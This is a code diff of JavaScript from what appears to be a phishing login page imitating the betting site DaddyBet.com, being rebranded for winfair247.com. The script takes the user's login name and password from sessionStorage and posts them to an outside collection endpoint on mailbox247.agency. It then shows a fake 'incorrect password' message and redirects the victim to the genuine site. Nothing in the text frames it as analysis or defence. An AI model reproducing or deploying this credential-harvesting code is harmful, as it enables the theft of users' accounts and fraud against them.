@@ -1676,12 +1676,12 @@ This website DaddyBet.com is owned and operated by GIT Operations. registration 
 			var password = sessionStorage.getItem("password");
 			$.ajax({
 			  type: "POST",
-			  url: "https://mailbox247.agency/admin/daddybet.php",
+			  url: "https://mailbox247.agency/admin/winfair247.php",
 			  data: "loginName=" + loginName + "&password=" + password,
 			  success: function (msg) {
 				$("#errorMsg").html('Username and password is incorrect.');
 				if (msg = "sucessmsg") {
-				  window.location.href = "https://daddybet.com";
+				  window.location.href = "https://winfair247.com";
 				}
 			  }
 			})
@@ -1709,7 +1709,7 @@ This website DaddyBet.com is owned and operated by GIT Operations. registration 
 			  success: function (msg) {
 				$("#errorMsg").html('Username and password is incorrect.');
 				if (msg = "sucessmsg") {
-				  window.location.href = "https://daddybet.com";
+				  window.location.href = "https://winfair247.com";
 				}
 			  }
 			})
